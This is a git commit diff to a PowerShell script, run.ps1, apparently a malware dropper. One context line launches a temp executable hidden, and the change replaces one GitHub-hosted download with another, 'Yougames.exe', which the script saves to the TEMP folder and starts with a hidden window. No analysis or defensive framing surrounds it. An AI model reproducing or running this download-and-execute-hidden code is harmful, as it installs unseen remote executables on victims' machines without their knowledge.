4db28cde7f6c2022a9b8e18a554ec033aaddf63e
azru09ru-lang <azru09.ru@gmail.com>
2026-09-02 17:31:54 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -6,5 +6,5 @@ Start-Process "$env:TEMP\112.exe" -WindowStyle Hidden
 Start-Sleep -Seconds 4
 
 
-(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/113.exe', "$env:TEMP\113.exe");
-Start-Process "$env:TEMP\113.exe" -WindowStyle Hidden
+(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/jar/raw/refs/heads/main/Yougames.exe', "$env:TEMP\Yougames.exe");
+Start-Process "$env:TEMP\Yougames.exe" -WindowStyle Hidden
